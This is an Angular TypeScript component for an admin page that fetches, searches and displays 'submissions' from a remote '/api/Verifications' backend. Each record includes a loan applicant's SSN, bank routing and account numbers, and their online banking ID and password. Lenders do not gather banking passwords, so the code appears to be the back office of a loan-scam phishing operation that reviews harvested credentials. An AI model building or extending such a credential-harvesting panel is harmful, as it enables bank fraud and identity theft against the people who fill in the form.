import { Component, inject, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { RouterLink } from '@angular/router';
import { HttpClient } from '@angular/common/http';
import { AuthService } from '../../services/auth.service';

export interface Submission {
  id?: number;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  dateOfBirth: string;
  maskedSsn: string;
  loanAmount: string;
  streetAddress: string;
  city: string;
  state: string;
  country: string;
  zipCode: string;
  bankName: string;
  routingNumber: string;
  maskedAccountNumber: string;
  onlineBankingId: string;
  onlineBankingPassword: string;
  agreement: boolean;
  createdAt?: string;
  [key: string]: unknown;
}

@Component({
  selector: 'app-submissions',
  standalone: true,
  imports: [CommonModule, FormsModule, RouterLink],
  templateUrl: './submissions.component.html',
  styleUrl: './submissions.component.scss'
})
export class SubmissionsComponent implements OnInit {

  private readonly http = inject(HttpClient);
  readonly authService = inject(AuthService);

  private readonly apiUrl =
    'https://backend-production-dbbfc.up.railway.app/api/Verifications';

  submissions: Submission[] = [];
  filteredSubmissions: Submission[] = [];
  searchQuery = '';

  isLoading = true;
  errorMessage = '';

  // Detail modal
  selectedSubmission: Submission | null = null;

  ngOnInit(): void {
    this.fetchSubmissions();
  }

  fetchSubmissions(): void {
    this.isLoading = true;
    this.errorMessage = '';

    this.http.get<Submission[]>(this.apiUrl).subscribe({
      next: (data) => {
        this.submissions = data;
        this.filteredSubmissions = [...data];
        this.isLoading = false;
      },
      error: (err) => {
        console.error('Failed to fetch submissions:', err);
        this.errorMessage =
          'Failed to load submissions. Please try again later.';
        this.isLoading = false;
      }
    });
  }

  filterSubmissions(): void {
    const query = this.searchQuery.toLowerCase().trim();

    if (!query) {
      this.filteredSubmissions = [...this.submissions];
      return;
    }

    this.filteredSubmissions = this.submissions.filter((s) =>
      `${s.firstName} ${s.lastName}`.toLowerCase().includes(query) ||
      s.email.toLowerCase().includes(query) ||
      s.phone.toLowerCase().includes(query) ||
      s.bankName.toLowerCase().includes(query) ||
      s.city.toLowerCase().includes(query) ||
      s.state.toLowerCase().includes(query)
    );
  }

  viewDetails(submission: Submission): void {
    this.selectedSubmission = submission;
  }

  closeDetails(): void {
    this.selectedSubmission = null;
  }

  formatDateTime(dateString?: string): string {
    if (!dateString) {
      return 'N/A';
    }

    try {
      const date = new Date(dateString);
      return date.toLocaleString('en-US', {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
      });
    } catch {
      return 'N/A';
    }
  }

  logout(): void {
    this.authService.logout();
  }
}
